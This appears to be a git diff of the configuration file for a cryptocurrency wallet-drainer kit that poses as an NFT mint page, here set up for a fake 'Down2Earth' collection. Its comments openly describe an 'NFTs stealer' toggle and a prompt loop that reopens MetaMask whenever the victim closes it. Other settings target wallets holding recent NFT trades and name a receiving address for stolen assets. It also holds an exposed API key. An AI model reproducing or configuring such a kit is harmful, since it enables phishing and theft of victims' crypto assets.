@@ -5,8 +5,8 @@ const moralisApi = "5W4uwFhOKOzZYW15hk4afH1mGcn02KXRObedwXKX"    // Web3 Api key
 
 const collectionInfo = {
     name: "Tec.sellix.io",
-    title: "Tec MINT Template", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
-    date: "XX.XX.XXXX", // Today date
+    title: "Down2Earth", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
+    date: "04.09.2022", // Today date
     socialMedia: {
         discord: "https://discord.gg/example",
         twitter: "https://twitter.com/example",
@@ -23,8 +23,8 @@ const collectionInfo = {
     }
 }
 const mintInfo = {
-    price: 0.2,         // Price per NFT.
-    totalSupply: 999,   // Total supply of NFTs.
+    price: 0.02,         // Price per NFT.
+    totalSupply: 564,   // Total supply of NFTs.
     minUnits: 1,        // Min units to buy.
     maxUnits: 6,        // Max units to buy.
     askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
@@ -32,7 +32,7 @@ const mintInfo = {
 
 const nftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
-    minValue: 0.2,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
+    minValue: 0.02,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
     checkMaxDay: 7, // Maximum number of days to check for the last transactions.
     receiveAddress: "" // leave empty if you want to use the same address 
 }
